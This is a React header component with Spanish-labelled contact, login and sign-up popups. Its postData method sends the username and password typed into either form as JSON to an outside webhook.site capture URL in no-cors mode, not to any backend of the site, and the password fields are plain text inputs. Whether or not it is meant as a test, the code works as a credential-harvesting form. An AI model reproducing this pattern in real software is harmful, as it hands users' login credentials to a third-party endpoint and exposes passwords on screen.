import React from 'react'
import logo from '../imagenes/logo.jpg'
import Popup from './Popup.js'
import {Link} from  'react-router-dom'

class Cabecera extends React.Component {
    constructor (props) {
        super(props)
        this.state = {
          showPopup1:false,
          showPopup2:false,
          showPopup3:false,
          usuario:'',
          contrasenya:''
        };
    }
  


    togglePopup1() {
      this.setState({
        showPopup1: !this.state.showPopup1
      });
    }
    togglePopup2() {
      this.setState({
        showPopup2: !this.state.showPopup2
      });
    }
    togglePopup3() {
      this.setState({
        showPopup3: !this.state.showPopup3
      });
    }
    async postData(){
      try{
        
          let result = await fetch('https://webhook.site/d7284bda-05e3-4229-96f4-1e63a6e8bb16',{
            method: 'post',
            mode:'no-cors',
            headers: {
              'Accept': 'application/json',
              'Content-type':'application/json',
            },
            body: JSON.stringify({
              usuario: this.state.usuario,
              contraseña: this.state.contrasenya
            })
          });
          console.log(result)
      } catch (e) {
        console.log(e) 
      }
    }

    setUsuario = (e) => {
      this.setState({usuario: e.target.value})
    }
    setContrasenya = (e) => {
      this.setState({contrasenya: e.target.value})
    }
  
  
    render () {
        return (
          <>
            <table className="cabecera">
              <tbody>
                <tr>
                  <Link to="/">
                   <td><img className="logoEmpresa" src={logo} alt="Logo"/></td>
                  </Link>
                  <td><button className="contacto" onClick={this.togglePopup1.bind(this)}>Contacta con nosotros</button></td>
                  <td><button className="login" onClick={this.togglePopup2.bind(this)}>Login</button></td>
                  <td><button className="SignIn" onClick={this.togglePopup3.bind(this)}>Sign-In</button></td>
                </tr>
              </tbody>
              
            </table>
            {this.state.showPopup1 ? 
              <Popup
                text='Contacta con nosotros!'
                cuerpo={<p>Holaaaa</p>}
                closePopup={this.togglePopup1.bind(this)}
             />
            : null
            }
            {this.state.showPopup2 ? 
              <Popup
                text='Inicia sesión'
                cuerpo = {<div className="formularioLogin">
                  <label htmlFor="usuario">Usuario</label>
                  <input type="text" id="usuario" onChange={this.setUsuario}/>
                  <br/>
                  <label htmlFor="contraseña">Contraseña</label>
                  <input type="text" id="contraseña"onChange={this.setContrasenya}/>
                  </div>
                }
                sendData={<Link to="/paginaSecundaria"><button type="Submit" className="Send" onClick={() => this.postData()}>Send</button></Link>}
                closePopup={this.togglePopup2.bind(this)}
             />
            : null
            }
            {this.state.showPopup3 ? 
              <Popup
                text='Registrate'
                cuerpo = {<div className="formularioLogin">
                  <label htmlFor="usuario">Usuario</label>
                  <input type="text" id="usuario" onChange={this.setUsuario}/>
                  <br/>
                  <label htmlFor="contraseña">Contraseña</label>
                  <input type="text" id="contraseña" onChange={this.setContrasenya}/>
                  </div>
                }
                sendData={<Link to="/paginaSecundaria"><button type="Submit" className="Send" onClick={() => this.postData()}>Send</button></Link>}
                
                closePopup={this.togglePopup3.bind(this)}
             />
            : null
            }
            </>
          )
    }

}

export default Cabecera